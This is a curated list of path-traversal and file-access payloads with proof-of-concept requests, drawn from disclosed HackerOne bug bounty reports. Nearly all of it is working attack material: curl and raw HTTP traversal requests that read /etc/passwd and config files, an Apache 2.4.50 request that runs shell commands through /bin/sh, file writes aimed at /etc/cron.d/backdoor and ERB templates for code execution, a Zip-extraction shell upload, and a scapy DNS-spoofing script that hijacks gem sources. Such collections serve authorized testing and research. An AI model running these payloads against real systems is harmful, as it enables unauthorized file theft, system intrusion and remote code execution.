# Path Traversal & File Access  -  curated payloads & PoCs

Snippets extracted from disclosed HackerOne writeups. For authorized testing only.

## 1. [#765291](https://hackerone.com/reports/765291)  -  Remote code execution via path traversal in Zip extraction in the Extract app
*high*

```http
POST /index.php/apps/extract/ajax/extractHere.php HTTP/1.1
Host: 192.168.100.32
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 55
Origin: https://192.168.100.32
Cookie: ocmmdvtkydkx=1u2e2imt5h7g0pimv84eoqnfco; oc_sessionPassphrase=MXmMNXhcE3%2FpbZla9mKTYIS18lYG…

nameOfFile=../../../../../../mnt/ncdata/normaluser/files/nextcloud-shell.zip&directory=/../../../../var/www/nextcloud/apps/files/lib&external=0
```

## 2. [#1404731](https://hackerone.com/reports/1404731)  -  Path Traversal and Remote Code Execution in Apache HTTP Server 2.4.50
*critical, $1,000*

```http
POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1
Host: 192.168.88.201
Content-Length: 60

echo Content-Type: text/plain; echo; id; uname;apache2ctl -M
```

## 3. [#924407](https://hackerone.com/reports/924407)  -  Local File Disclosure /Delete On [us-az-vpn.acronis.com]
*medium*

```http
GET /+CSCOE+/session_password.html HTTP/1.1
Host: 192.168.1.100
Cookie: token=../../../../../../+CSCOE+/wrong_url.html
```

## 4. [#355501](https://hackerone.com/reports/355501)  -  [servey] Path Traversal allows to retrieve content of any file with extension from remote server
*medium*

```bash
$ curl -v --path-as-is localhost:8080/../../../../../../etc/passwd
*   Trying ::1...
* connect to ::1 port 8080 failed: Connection refused
*   Trying 127.0.0.1...
* Connected to localhost (127.0.0.1) port 8080 (#0)
> GET /../../../../../../etc/passwd HTTP/1.1
> Host: localhost:8080
> User-Agent: curl/7.47.0
> Accept: */*
> 
< HTTP/1.1 500 Internal Server Error
< Content-Type: text/html; charset=utf8
< Date: Mon, 21 May 2018 13:08:15 GMT
< Connection: keep-alive
< Transfer-Encoding: chunked
< 
* Connection #0 to host localhost left intact
{"code":500,"message":"Internal Server Error"}
```

## 5. [#343726](https://hackerone.com/reports/343726)  -  Unrestricted file upload (RCE)
*critical*

```http
POST /admin/file/upload HTTP/1.1
Host: localhost:1111
Referer: http://localhost:1111/
Content-Type: multipart/form-data; boundary=---------------------------1099055603892737061752875043
Cookie: [ADMINISTRATOR_COOKIE]

-----------------------------1099055603892737061752875043
Content-Disposition: form-data; name="upload_file"; filename="app.js"
Content-Type: image/png

[MALICIOUS_JAVASCRIPT]
-----------------------------1099055603892737061752875043
Content-Disposition: form-data; name="productId"

5ae2228d995e3e5d7c96474d
-----------------------------1099055603892737061752875043
Content-Disposition: form-data; name="directory"

../../
-----------------------------1099055603892737061752875043
Content-Disposition: form-data; name="saveButton"

-----------------------------1099055603892737061752875043--
```

## 6. [#765291](https://hackerone.com/reports/765291)  -  Remote code execution via path traversal in Zip extraction in the Extract app
*high*

```http
POST /index.php/apps/extract/ajax/extractHere.php HTTP/1.1
Host: 192.168.100.32
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 55
Origin: https://192.168.100.32
```

## 7. [#360727](https://hackerone.com/reports/360727)  -  [markdown-pdf] Local file reading
*medium*

```html
<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///etc/passwd");x.send();</script>
```

## 8. [#360727](https://hackerone.com/reports/360727)  -  [markdown-pdf] Local file reading
*medium*

```
# this is h1
<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///etc/passwd");x.send();</script>
```

## 9. [#1404731](https://hackerone.com/reports/1404731)  -  Path Traversal and Remote Code Execution in Apache HTTP Server 2.4.50
*critical, $1,000*

```http
GET /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd HTTP/1.1
Host: localhost:83
```

## 10. [#869888](https://hackerone.com/reports/869888)  -  Path Traversal in App Proxy
*medium*

```http
GET /apps/ss/b.php/../../?shop=a&Shop=asd HTTP/1.1
Host: ███████
```

## 11. [#310690](https://hackerone.com/reports/310690)  -  [crud-file-server] Path Traversal allows to read arbitrary file from the server
*medium*

```bash
$ curl -v --path-as-is http://127.0.0.1:8080/../../../../etc/passwd
*   Trying 127.0.0.1...
* TCP_NODELAY set
* Connected to 127.0.0.1 (127.0.0.1) port 8080 (#0)
> GET /../../../../etc/passwd HTTP/1.1
> Host: 127.0.0.1:8080
> User-Agent: curl/7.54.0
> Accept: */*
>
< HTTP/1.1 500 Internal Server Error
< Content-Type: application/json
< Date: Wed, 31 Jan 2018 00:01:49 GMT
< Connection: keep-alive
< Content-Length: 71
<
* Connection #0 to host 127.0.0.1 left intact
{"errno":-2,"code":"ENOENT","syscall":"stat","path":"./////etc/passwd"}
```

## 12. [#342066](https://hackerone.com/reports/342066)  -  [bruteser] Path Traversal allows to read content of arbitrary file
*medium*

```bash
$ curl -v --path-as-is http://localhost:8080/../../../../../../../../etc/passwd
*   Trying ::1...
* Connected to localhost (::1) port 8080 (#0)
> GET /../../../../../../../../etc/passwd HTTP/1.1
> Host: localhost:8080
> User-Agent: curl/7.47.0
> Accept: */*
> 
< HTTP/1.1 200 OK
< Date: Mon, 23 Apr 2018 13:15:43 GMT
< Connection: keep-alive
< Transfer-Encoding: chunked
< 
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
(...)
mysql:x:125:132:MySQL Server,,,:/nonexistent:/bin/false
* Connection #0 to host localhost left intact
```

## 13. [#319795](https://hackerone.com/reports/319795)  -  [m-server] Path Traversal allows to display content of arbitrary file(s) from the server
*medium*

```bash
$ curl -v --path-as-is http://localhost:8080/../../../../../../etc/passwd
*   Trying ::1...
* Connected to localhost (::1) port 8080 (#0)
> GET /../../../../../../etc/passwd HTTP/1.1
> Host: localhost:8080
> User-Agent: curl/7.47.0
> Accept: */*
> 
< HTTP/1.1 200 OK
< Date: Mon, 26 Feb 2018 13:38:37 GMT
< Connection: keep-alive
< Content-Length: 2615
< 
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
(...)
mysql:x:125:132:MySQL Server,,,:/nonexistent:/bin/false
* Connection #0 to host localhost left intact
```

## 14. [#355456](https://hackerone.com/reports/355456)  -  [statics-server] Path Traversal due to lack of provided path sanitization
*medium*

```bash
$ curl -v --path-as-is http://127.0.0.1:8080/../../../../../../../../etc/passwd
*   Trying 127.0.0.1...
* Connected to 127.0.0.1 (127.0.0.1) port 8080 (#0)
> GET /../../../../../../../../etc/passwd HTTP/1.1
> Host: 127.0.0.1:8080
> User-Agent: curl/7.47.0
> Accept: */*
> 
< HTTP/1.1 200 OK
< Date: Mon, 14 May 2018 14:53:15 GMT
< Connection: keep-alive
< Transfer-Encoding: chunked
< 
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
(...)
mongodb:x:126:65534::/var/lib/mongodb:/bin/false
* Connection #0 to host 127.0.0.1 left intact
```

## 15. [#3580511](https://hackerone.com/reports/3580511)  -  ActiveStorage Disk Service Path Traversal via Custom Blob Key Injection
*medium*

```http
POST /api/v1/documents HTTP/1.1
Content-Type: application/json

{
  "file_data": "KiBldmlsIGNyb250YWIgZW50cnkK",
  "filename": "notes.txt",
  "content_type": "text/plain",
  "path": "../../../../etc/cron.d/backdoor"
}
```

## 16. [#3580511](https://hackerone.com/reports/3580511)  -  ActiveStorage Disk Service Path Traversal via Custom Blob Key Injection
*medium*

```http
POST /assets HTTP/1.1
Content-Type: multipart/form-data

avatar[filename]=photo.jpg
avatar[content_type]=image/jpeg
avatar[key]=../../../../../../tmp/malicious_payload
file=@payload.jpg
```

## 17. [#319003](https://hackerone.com/reports/319003)  -  [stattic] Inproper path validation leads to Path Traversal and allows to read arbitrary files with any extension(s)
*high*

```bash
$ curl -v --path-as-is http://localhost:8080/../../../../../etc/hosts.deny
*   Trying ::1...
* Connected to localhost (::1) port 8080 (#0)
> GET /../../../../../etc/hosts.deny HTTP/1.1
> Host: localhost:8080
> User-Agent: curl/7.47.0
> Accept: */*
> 
< HTTP/1.1 200 OK
< Content-Type: null
< Date: Fri, 23 Feb 2018 12:36:35 GMT
< Connection: keep-alive
< Transfer-Encoding: chunked
< 
# /etc/hosts.deny: list of hosts that are _not_ allowed to access the system.
#                  See the manual pages hosts_access(5) and hosts_options(5).
#
# Example:    ALL: some.host.name, .some.domain
#             ALL EXCEPT in.fingerd: other.host.name, .other.domain
#
# If you're going to protect the portmapper use the name "rpcbind" for the
# daemon name. See rpcbind(8) and rpc.mountd(8) for further information.
#
# The PARANOID wildcard matches any host whose name does not match its
# address.
#
# You may wish to enable this to ensure any programs that don't
# validate looked up hostnames still leave understandable logs. In past
# versions of Debian this has been the default.
# ALL: PARANOID

* Connection #0 to host localhost left intact
```

## 18. [#311216](https://hackerone.com/reports/311216)  -  [626] Path Traversal allows to read arbitrary file from remote server
*high*

```bash
$ curl -v --path-as-is http://127.0.0.1:8080/../../../../etc/passwd
*   Trying 192.168.1.1...
* TCP_NODELAY set
* Connected to 192.168.1.1 (192.168.1.1) port 8080 (#0)
> GET /../../../../../etc/passwd HTTP/1.1
> Host: 192.168.1.1:8080
> User-Agent: curl/7.54.0
> Accept: */*
>
< HTTP/1.1 200 OK
< Date: Wed, 31 Jan 2018 22:51:06 GMT
< Connection: keep-alive
< Content-Length: 6774
<
##
# User Database
#
# Note that this file is consulted directly only when the system is running
# in single-user mode.  At other times this information is provided by
# Open Directory.
#
# See the opendirectoryd(8) man page for additional information about
# Open Directory.
##
nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
root:*:0:0:System Administrator:/var/root:/bin/sh
(...)
```

## 19. [#291878](https://hackerone.com/reports/291878)  -  Arbitrary file deletion in wp-core - guides towards RCE and information disclosure
*critical*

```bash
curl 'http://localhost/ripsa/wpvuln/wp-admin/post.php?post=[your_postid]&action=editattachment&_wpnonce=[yournonce]' -H 'place your client headers: ua, cookies in order to mimic the authenticated user ' -d 'thumb=../../../../wp-config-slavco.php' --compressed
```

## 20. [#306607](https://hackerone.com/reports/306607)  -  [html-pages] Path Traversal in html-pages module allows to read any file from the server with curl
*critical*

```bash
$ curl -v --path-as-is http://localhost:8000/../../../../../Users/bl4de/.vimrc
```

## 21. [#306607](https://hackerone.com/reports/306607)  -  [html-pages] Path Traversal in html-pages module allows to read any file from the server with curl
*critical*

```bash
$ curl -v --path-as-is http://127.0.0.1:8000/../../../../../etc/passwd
```

## 22. [#358645](https://hackerone.com/reports/358645)  -  [serve] Server Directory Traversal
*critical*

```bash
$ curl --path-as-is 'http://127.0.0.1:3000/../../../../../../etc/passwd'
##
# User Database
#
# Note that this file is consulted directly only when the system is running
# in single-user mode.  At other times this information is provided by
# Open Directory.
#
# See the opendirectoryd(8) man page for additional information about
# Open Directory.
##
nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
root:*:0:0:System Administrator:/var/root:/bin/sh
daemon:*:1:1:System Services:/var/root:/usr/bin/false
...
```

## 23. [#310690](https://hackerone.com/reports/310690)  -  [crud-file-server] Path Traversal allows to read arbitrary file from the server
*medium*

```bash
$ curl -v --path-as-is http://127.0.0.1:8080/../../../../etc/passwd
*   Trying 127.0.0.1...
* TCP_NODELAY set
* Connected to 127.0.0.1 (127.0.0.1) port 8080 (#0)
> GET /../../../../etc/passwd HTTP/1.1
> Host: 127.0.0.1:8080
> User-Agent: curl/7.54.0
> Accept: */*
>
< HTTP/1.1 200 OK
< Content-Type: application/octet-stream
< Content-Length: 6774
< Date: Wed, 31 Jan 2018 00:01:31 GMT
< Connection: keep-alive
<
##
# User Database
#
# Note that this file is consulted directly only when the system is running
# in single-user mode.  At other times this information is provided by
# Open Directory.
#
# See the opendirectoryd(8) man page for additional information about
# Open Directory.
##
nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
root:*:0:0:System Administrator:/var/root:/bin/sh
daemon:*:1:1:System Services:/var/root:/usr/bin/false
_uucp:*:4:4:Unix to Unix Copy Protocol:/var/spool/uucp:/usr/sbin/uucico
_taskgated:*:13:13:Task Gate Daemon:/var/empty:/usr/bin/false
(...)
```

## 24. [#355501](https://hackerone.com/reports/355501)  -  [servey] Path Traversal allows to retrieve content of any file with extension from remote server
*medium*

```bash
$ curl -v --path-as-is localhost:8080/../../../../../../etc/hosts.allow
*   Trying ::1...
* connect to ::1 port 8080 failed: Connection refused
*   Trying 127.0.0.1...
* Connected to localhost (127.0.0.1) port 8080 (#0)
> GET /../../../../../../etc/hosts.allow HTTP/1.1
> Host: localhost:8080
> User-Agent: curl/7.47.0
> Accept: */*
> 
< HTTP/1.1 200 OK
< Content-Type: undefined; charset=utf8
< Date: Mon, 21 May 2018 13:06:38 GMT
< Connection: keep-alive
< Transfer-Encoding: chunked
< 
# /etc/hosts.allow: list of hosts that are allowed to access the system.
#                   See the manual pages hosts_access(5) and hosts_options(5).
#
# Example:    ALL: LOCAL @some_netgroup
#             ALL: .foobar.edu EXCEPT terminalserver.foobar.edu
#
# If you're going to protect the portmapper use the name "rpcbind" for the
# daemon name. See rpcbind(8) and rpc.mountd(8) for further information.
#

* Connection #0 to host localhost left intact
```

## 25. [#1415820](https://hackerone.com/reports/1415820)  -  Zero day path traversal vulnerability in Grafana 8.x allows unauthenticated arbitrary local file read
*high, $1,000*

```bash
curl --path-as-is https://grafana-303ca6f8-█████████.aivencloud.com/public/plugins/mysql/../../../../../../../../../../../../usr/share/grafana/conf/defaults.ini
```

## 26. [#311218](https://hackerone.com/reports/311218)  -  [hekto] Path Traversal vulnerability allows to read content of arbitrary files
*high*

```bash
$ curl -v --path-as-is http://127.0.0.1:3000/../../../../../etc/passwd
```

## 27. [#309120](https://hackerone.com/reports/309120)  -  [angular-http-server] Path Traversal in angular-http-server.js allows to read arbitrary file from the remote server
*high*

```bash
$ curl -v --path-as-is http://127.0.0.1:8080/../../../../../etc/passwd
```

## 28. [#310943](https://hackerone.com/reports/310943)  -  [general-file-server] Path Traversal vulnerability allows to read content on arbitrary file on the server
*high*

```bash
$ curl -v --path-as-is http://127.0.0.1:8080/../../../../../../etc/passwd
```

## 29. [#310943](https://hackerone.com/reports/310943)  -  [general-file-server] Path Traversal vulnerability allows to read content on arbitrary file on the server
*high*

```
*   Trying 127.0.0.1...
* Connected to 127.0.0.1 (127.0.0.1) port 8080 (#0)
> GET /../../../../../../etc/passwd HTTP/1.1
> Host: 127.0.0.1:8080
> User-Agent: curl/7.47.0
> Accept: */*
> 
< HTTP/1.1 200 OK
< Content-Type: application/octet-stream
< Date: Wed, 31 Jan 2018 12:53:13 GMT
< Connection: keep-alive
< Transfer-Encoding: chunked
< 
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
(...)
```

## 30. [#312889](https://hackerone.com/reports/312889)  -  [localhost-now] Path Traversal allows to read content of arbitrary file
*high*

```
*   Trying ::1...
* Connected to localhost (::1) port 1337 (#0)
> GET /../../../../../etc/passwd HTTP/1.1
> Host: localhost:1337
> User-Agent: curl/7.47.0
> Accept: */*
> 
< HTTP/1.1 200 OK
< content-type: text/
< Date: Tue, 06 Feb 2018 14:06:55 GMT
< Connection: keep-alive
< Content-Length: 2615
< 
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
(...)
```

## 31. [#310106](https://hackerone.com/reports/310106)  -  [glance] Path Traversal in glance static file server allows to read content of arbitrary file
*high*

```bash
curl -v --path-as-is http://127.0.0.1:8080/../../../../../../etc/passwd
```

## 32. [#330285](https://hackerone.com/reports/330285)  -  [mcstatic] Server Directory Traversal
*high*

```bash
$ curl --path-as-is 'http://127.0.0.1:6060/../../../../../../../../../etc/passwd'
##
# User Database
#
# Note that this file is consulted directly only when the system is running
# in single-user mode.  At other times this information is provided by
# Open Directory.
#
# See the opendirectoryd(8) man page for additional information about
# Open Directory.
##
nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
root:*:0:0:System Administrator:/var/root:/bin/sh
...
```

## 33. [#309124](https://hackerone.com/reports/309124)  -  [node-srv] Path Traversal allows to read arbitrary files from remote server
*high*

```bash
$ curl -v --path-as-is http://127.0.0.1:8080/node_modules/../../../../../etc/hosts
```

## 34. [#311216](https://hackerone.com/reports/311216)  -  [626] Path Traversal allows to read arbitrary file from remote server
*high*

```bash
$ curl -v --path-as-is http://127.0.0.1:8080/../../../../etc/passwd
```

## 35. [#312907](https://hackerone.com/reports/312907)  -  [mcstatic] Path Traversal allows to read content of arbitrary files
*high*

```bash
$ curl -v --path-as-is http://127.0.0.1:8080/../../../../../etc/hosts
```

## 36. [#312907](https://hackerone.com/reports/312907)  -  [mcstatic] Path Traversal allows to read content of arbitrary files
*high*

```
*   Trying 127.0.0.1...
* Connected to 127.0.0.1 (127.0.0.1) port 8080 (#0)
> GET /../../../../../etc/hosts HTTP/1.1
> Host: 127.0.0.1:8080
> User-Agent: curl/7.47.0
> Accept: */*
> 
< HTTP/1.1 200 OK
< last-modified: Tue, 23 Jan 2018 14:51:52 GMT
< content-length: 188
< content-type: application/octet-stream
< Date: Tue, 06 Feb 2018 15:40:51 GMT
< Connection: keep-alive
< 
127.0.0.1	localhost
127.0.1.1	LT0081U2

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
* Connection #0 to host 127.0.0.1 left intact
```

## 37. [#329837](https://hackerone.com/reports/329837)  -  Bypass to defective fix of Path Traversal
*high*

```bash
$ curl -v --path-as-is "http://IP:5432/..././..././..././..././..././..././..././..././..././..././etc/passwd"
root:x:0:0:root:/root:/usr/bin/fish
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```

## 38. [#383112](https://hackerone.com/reports/383112)  -  [ponse] Path traversal in ponse module allows to read any file on server
*high*

```bash
$ curl --path-as-is localhost:1337/../../../../../../../etc/passwd
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/usr/bin/nologin
daemon:x:2:2:daemon:/:/usr/bin/nologin
...
```

## 39. [#579517](https://hackerone.com/reports/579517)  -  [hnzserver] Path Traversal allowing to read any files on the server
*high*

```bash
$ curl --path-as-is --url 'http://127.0.0.1:8888/../../../../etc/passwd'
```

## 40. [#579523](https://hackerone.com/reports/579523)  -  [http_server] Path Traversal allowing to read any files on the server
*high*

```bash
$ curl --path-as-is --url 'http://localhost:8888/../../../../../etc/passwd'
```

## 41. [#581939](https://hackerone.com/reports/581939)  -  [static-server-gx] Path Traversal allowing to read any files on the server
*high*

```bash
curl --path-as-is --url "localhost:10000/../../../../etc/passwd"
```

## 42. [#333306](https://hackerone.com/reports/333306)  -  Directory traversal at https://msg.algolia.com
*medium*

```http
GET /static/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd HTTP/1.1
Host: msg.algolia.com
Cookie: __cfduid=d34587d94eba9413080d1f7aca5062a871522817854

Response:
```

## 43. [#2032778](https://hackerone.com/reports/2032778)  -  Internal machine learning API endpoint for CWE classification is vulnerable to path traversal
*medium*

```bash
curl -X POST http://localhost:8082/predict/report_weakness_id -H 'content-type: application/json' -d'{"version":"v1", "trained_at": "2023-01-01T00:00:00Z/../../..", "input": [{"title": "test xss", "num_of_top_predictions": 3}]}'
```

## 44. [#2032778](https://hackerone.com/reports/2032778)  -  Internal machine learning API endpoint for CWE classification is vulnerable to path traversal
*medium*

```bash
curl -X POST http://localhost:8082/predict/report_weakness_id -H 'content-type: application/json' -d'{"version":"v1/../../../..", "trained_at": "2023-01-01T00:00:00Z", "input": [{"title": "test xss", "num_of_top_predictions": 3}]}'
```

## 45. [#296645](https://hackerone.com/reports/296645)  -  [lactate] Static Web Server Directory Traversal via Crafted GET Request
*medium*

```bash
curl "http://<server-IP>:8081/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
```

## 46. [#822262](https://hackerone.com/reports/822262)  -  Path traversal in Nuget Package Registry
*high, $12,000*

```
name the file above as `dummy.nuspec` and zip it into `dummy.nupkg` and upload it through `PUT /api/v4/projects/#{id}/packages/nuget/` endpoint  will make GitLab to create a `nyangawa.nupkg` somewhere in the filesystem.

Then I wrote a script (I used in #762421) to combine this issue and the race in Gitaly. I could finally read any file I want in my GitLab instance.

### Steps to reproduce

1. Download the attached exploit.tar.gz and extract it.
2. Install some requirements by gem install faraday and gem install rubyzip
3. Edit exp.rb to update some url and credentials
4. Execute the exp.rb to watch the result of .gitlab_shell_secret of target GitLab instance.

### Examples
{F750878}

#### Results of GitLab environment info
```

## 47. [#311218](https://hackerone.com/reports/311218)  -  [hekto] Path Traversal vulnerability allows to read content of arbitrary files
*high*

```
*   Trying 127.0.0.1...
* TCP_NODELAY set
* Connected to 127.0.0.1 (127.0.0.1) port 3000 (#0)
> GET /../../../../../etc/passwd HTTP/1.1
> Host: 127.0.0.1:3000
> User-Agent: curl/7.54.0
> Accept: */*
>
< HTTP/1.1 200 OK
< Vary: Accept-Encoding
< X-Powered-By: Hekto
< Content-Type: text/plain; charset=utf-8
< Date: Wed, 31 Jan 2018 23:08:42 GMT
< Connection: keep-alive
< Transfer-Encoding: chunked
<
##
# User Database
#
# Note that this file is consulted directly only when the system is running
# in single-user mode.  At other times this information is provided by
# Open Directory.
#
# See the opendirectoryd(8) man page for additional information about
# Open Directory.
##
nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
root:*:0:0:System Administrator:/var/root:/bin/sh
(...)
```

## 48. [#310106](https://hackerone.com/reports/310106)  -  [glance] Path Traversal in glance static file server allows to read content of arbitrary file
*high*

```
me:~/playground/hackerone/Node$ curl -v --path-as-is http://127.0.0.1:8080/../../../../../../etc/passwd
*   Trying 127.0.0.1...
* Connected to 127.0.0.1 (127.0.0.1) port 8080 (#0)
> GET /../../../../../../etc/passwd HTTP/1.1
> Host: 127.0.0.1:8080
> User-Agent: curl/7.47.0
> Accept: */*
> 
< HTTP/1.1 200 OK
< content-type: application/octet-stream
< etag: 6d51e6677c898282619137b0c74f0cab
< last-modified: Fri, 26 Jan 2018 12:04:19 +0000
< content-length: 2559
< Date: Mon, 29 Jan 2018 10:23:45 GMT
< Connection: keep-alive
< 
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
(..)
guest-cz1ton:x:999:999:Guest:/tmp/guest-cz1ton:/bin/bash
postgres:x:124:131:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
* Connection #0 to host 127.0.0.1 left intact
me:~/playground/hackerone/Node$
```

## 49. [#343726](https://hackerone.com/reports/343726)  -  Unrestricted file upload (RCE)
*critical*

```http
POST /admin/file/upload HTTP/1.1
Host: localhost:1111
Referer: http://localhost:1111/
Content-Type: multipart/form-data; boundary=---------------------------1099055603892737061752875043
Cookie: [ADMINISTRATOR_COOKIE]

-----------------------------1099055603892737061752875043
```

## 50. [#3580511](https://hackerone.com/reports/3580511)  -  ActiveStorage Disk Service Path Traversal via Custom Blob Key Injection
*medium*

```
../../tmp/activestorage_poc_#{SecureRandom.hex(4)}
```

## 51. [#519220](https://hackerone.com/reports/519220)  -  File writing by Directory traversal at actionpack-page_caching and RCE by it
*high, $1,000*

```log
❯ curl "http://localhost:3000/books/1%2f%2e%2e%2f%2e%2e%2f%2e%2e%2ftest"

# test file is generated
❯ ls
app  config     db       Gemfile.lock  log           public    README.md  test       tmp
bin  config.ru  Gemfile  lib           package.json  Rakefile  storage    test.html  vendor


❯ curl "http://localhost:3000/books/1%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fREADME%2emd"

# If the file exists it will be overwritten
❯ cat README.md
...
<p>
  <strong>Name:</strong>
  &lt;% `touch me` %&gt;
</p>
...
```

## 52. [#519220](https://hackerone.com/reports/519220)  -  File writing by Directory traversal at actionpack-page_caching and RCE by it
*high, $1,000*

```log
# overwrite erb
❯ curl "http://localhost:3000/books/1%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fapp%2fviews%2fbooks%2fshow%2etext%2eerb?format=text"
name: <% `touch me` %>

❯ cat app/views/books/show.text.erb
name: <% `touch me` %>


# executed `touch me`
❯ curl "http://localhost:3000/books/1.txt"
name:

# me file is generated
❯ ls
app  config     db       Gemfile.lock  log  package.json  Rakefile   storage  test.html  vendor
bin  config.ru  Gemfile  lib           me   public        README.md  test     tmp
```

## 53. [#411519](https://hackerone.com/reports/411519)  -  DNS SRV lookup of file:// sources enables local hijacking of gems
*high, $500*

```python
#!/usr/bin/env python3

from scapy.all import *

TARGET = b"xxx./tmp/attack"

def respond(pkt):
    if not (DNS in pkt and pkt[DNS].opcode == 0 and pkt[DNS].ancount == 0):
        return
    q = pkt[DNSQR]
    # Nothing after "_rubygems._tcp." indicates that the host is empty;
    # i.e., that it's likely a lookup for a file:// URL. 33 == SRV.
    if not (q.qname == b"_rubygems._tcp." and q.qtype == 33):
        return
    resp = IP(src=pkt[IP].dst, dst=pkt[IP].src) \
        / UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport) \
        / DNS(qr=1, id=pkt[DNS].id, qd=q, ancount=1) \
        / DNSRRSRV(type=33, rrname=q.qname, ttl=30, priority=0, weight=1, port=80, rdlen=8+len(TARGET), target=TARGET)
    send(resp)

sniff(filter="udp dst port 53", prn=respond)
```

## 54. [#411519](https://hackerone.com/reports/411519)  -  DNS SRV lookup of file:// sources enables local hijacking of gems
*high, $500*

```
victim$ gem fetch --clear-sources --source file:///home/victim/trusted-gem-path minitest
victim$ tar -O -xf minitest-5.11.3.gem -- data.tar.gz | tar tzf -
lib/hacked.rb
```

## 55. [#309120](https://hackerone.com/reports/309120)  -  [angular-http-server] Path Traversal in angular-http-server.js allows to read arbitrary file from the remote server
*high*

```javascript
fs.stat(possibleFilename, function(err, stats) {
        var fileBuffer;
        if (!err && stats.isFile()) {
            fileBuffer = fs.readFileSync(possibleFilename);
            let ct = mime.lookup(possibleFilename);
            console.log(`Sending ${possibleFilename} with Content-Type ${ct}`);
            res.writeHead(200, { 'Content-Type': ct });

        } else {
            console.log("Route %s, replacing with index.html", possibleFilename);
            fileBuffer = returnDistFile();
            res.writeHead(200, { 'Content-Type': 'text/html' });
        }

        res.write(fileBuffer);
        res.end();
    });
```

## 56. [#310671](https://hackerone.com/reports/310671)  -  [file-static-server] Path Traversal allows to read content of arbitrary file on the server
*low*

```
*   Trying 192.168.1.1...
* TCP_NODELAY set
* Connected to 192.168.1.1 (192.168.1.1) port 8080 (#0)
> GET /../../../../etc/passwd HTTP/1.1
> Host: 192.168.1.1:8080
> User-Agent: curl/7.54.0
> Accept: */*
>
< HTTP/1.1 200 OK
< server: static-1.0.2
< content-type: application/octet-stream; charset=utf-8
< content-length: 6774
< etag: 898b8e56263723beb06955d4a7c2944d1eff7a21
< cache-control: public; max-age=3153600000000
< Date: Tue, 30 Jan 2018 23:27:23 GMT
< Connection: keep-alive
<
##
# User Database
#
# Note that this file is consulted directly only when the system is running
# in single-user mode.  At other times this information is provided by
# Open Directory.
#
# See the opendirectoryd(8) man page for additional information about
# Open Directory.
##
nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
root:*:0:0:System Administrator:/var/root:/bin/sh
daemon:*:1:1:System Services:/var/root:/usr/bin/false
_uucp:*:4:4:Unix to Unix Copy Protocol:/var/spool/uucp:/usr/sbin/uucico
_taskgated:*:13:13:Task Gate Daemon:/var/empty:/usr/bin/false
(...)
```

## 57. [#3580511](https://hackerone.com/reports/3580511)  -  ActiveStorage Disk Service Path Traversal via Custom Blob Key Injection
*medium*

```http
POST /api/v1/documents HTTP/1.1
Content-Type: application/json

{
```

## 58. [#3580511](https://hackerone.com/reports/3580511)  -  ActiveStorage Disk Service Path Traversal via Custom Blob Key Injection
*medium*

```http
POST /assets HTTP/1.1
Content-Type: multipart/form-data

avatar[filename]=photo.jpg
```

## 59. [#3634571](https://hackerone.com/reports/3634571)  -  Path Traversal in writeFile via Unsafe Prefix Containment Check Allows Out-of-Directory Writes
*medium*

```bash
TIPSEN:~:% python
Python 3.13.9 (main, Oct 15 2025, 14:56:22) [GCC 15.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> name = b'../out_pwn/evil.proto'
... with open('/tmp/evil.bin', 'wb') as f:
...     f.write(bytes([0x0a, len(name)]) + name + b'\x00')
...
24
>>> exit
TIPSEN:~:% mkdir -p /tmp/out /tmp/out_pwn
TIPSEN:~:% ls /tmp/out
TIPSEN:~:% ls /tmp/out_pwn
TIPSEN:~:% /tmp/protodump -file /tmp/evil.bin -output /tmp/out
Wrote /tmp/out_pwn/evil.proto
TIPSEN:~:% ls /tmp/out
TIPSEN:~:% ls /tmp/out_pwn
evil.proto
```

## 60. [#2256167](https://hackerone.com/reports/2256167)  -  Path traversal through path stored in Uint8Array in Node.js 20
*high, $3,495*

```bash
$ node --experimental-permission \
        --allow-fs-read=/tmp/ \
        -p 'fs.readFileSync(new TextEncoder().encode("/tmp/../etc/passwd"))'
